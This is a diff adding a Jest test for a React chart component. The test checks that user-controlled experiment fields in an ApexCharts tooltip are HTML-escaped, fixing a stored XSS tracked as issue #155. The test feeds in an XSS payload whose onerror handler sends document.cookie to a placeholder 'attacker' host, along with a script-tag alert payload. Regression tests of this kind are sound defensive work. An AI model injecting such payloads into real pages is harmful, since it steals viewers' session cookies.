@@ -876,4 +876,56 @@ describe('WorldlineMonitor — failure paths, filters and chart callbacks', () =
     expect(options.dataLabels.formatter(1.23456789)).toBe('1.234568');
     expect(options.dataLabels.formatter(0)).toBe('0.000000');
   });
+
+  // Issue #155: ApexCharts writes the tooltip string straight into the
+  // DOM, bypassing React's auto-escaping. The backend never sanitises
+  // any of the experiment fields, so a stored XSS on `name` /
+  // `creator_id` / `description` / `results` would otherwise fire for
+  // every viewer of /dashboard. This test pins the escape: every
+  // user-controlled field is rendered as text, not as HTML.
+  test('the chart tooltip HTML-escapes user-controlled experiment fields (issue #155 stored XSS)', async () => {
+    const xssPayload = "<img src=x onerror=\"fetch('https://attacker/?c='+document.cookie)\">";
+    getWorldlineHistory.mockResolvedValueOnce([
+      { current_worldline: 1.0, total_divergence: 0.0, timestamp: 't0', added_experiment: null },
+      {
+        current_worldline: 1.5, total_divergence: 0.5, timestamp: 't1',
+        added_experiment: {
+          name: xssPayload,
+          creator_id: `Attacker <script>alert('x')</script>`,
+          status: 'completed <>&"\'',
+          description: xssPayload,
+          results: `Result with & < > " ' chars`
+        }
+      }
+    ]);
+
+    render(<WorldlineMonitor />);
+    await waitFor(() => {
+      expect(screen.getByTestId('mock-apex-chart')).toBeInTheDocument();
+    });
+
+    const { options } = globalThis.__apexLastProps;
+    const series = [[1.0, 1.5]];
+    const html = options.tooltip.custom({ series, seriesIndex: 0, dataPointIndex: 1, w: {} });
+
+    // The raw payload must NOT survive into the rendered HTML: no raw
+    // tag openers from user data, no raw closing brackets, no raw
+    // `<script>` / `</script>` (a CSP bypass that did not exist in our
+    // current `script-src 'self'` build could otherwise turn those into
+    // live script). Note: the literal substring `onerror=` IS allowed
+    // to appear in the text node — the browser only treats it as an
+    // event-handler attribute when wrapped in unescaped `<...>`, and
+    // we have escaped those angle brackets.
+    expect(html).not.toContain('<img');
+    expect(html).not.toContain('</script>');
+    expect(html).not.toContain('<script>');
+
+    // Each special char appears only in its escaped form within the
+    // user-controlled segments. The literal payload text never makes
+    // it through.
+    expect(html).toContain('&lt;img src=x onerror=&quot;fetch(&#39;https://attacker/?c=&#39;+document.cookie)&quot;&gt;');
+    expect(html).toContain('By: Attacker &lt;script&gt;alert(&#39;x&#39;)&lt;/script&gt;');
+    expect(html).toContain('Status: completed &lt;&gt;&amp;&quot;&#39;');
+    expect(html).toContain('<strong>Results:</strong> Result with &amp; &lt; &gt; &quot; &#39; chars');
+  });
 });
